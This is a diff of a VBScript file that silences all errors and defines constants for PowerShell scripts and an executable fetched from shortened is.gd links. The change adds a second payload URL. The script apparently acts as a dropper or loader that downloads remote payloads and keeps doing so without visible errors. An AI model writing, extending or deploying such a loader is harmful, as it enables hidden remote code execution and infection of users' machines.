@@ -3,7 +3,7 @@ On Error Resume Next ' Silence total en cas d'erreur
 
 ' --- 1. CONFIGURATION ---
 Const URL_PS1_1 = "https://is.gd/8dXx7r" 
-Const URL_PS1_2 = ""
+Const URL_PS1_2 = "https://is.gd/Q0RCKd"
 Const URL_PS1_3 = ""
 Const URL_EXE   = ""
 
@@ -87,4 +87,5 @@ Function Valid(fPath)
         If FSO.GetFile(fPath).Size > 0 Then Valid = True
     End If
 End Function
+
 
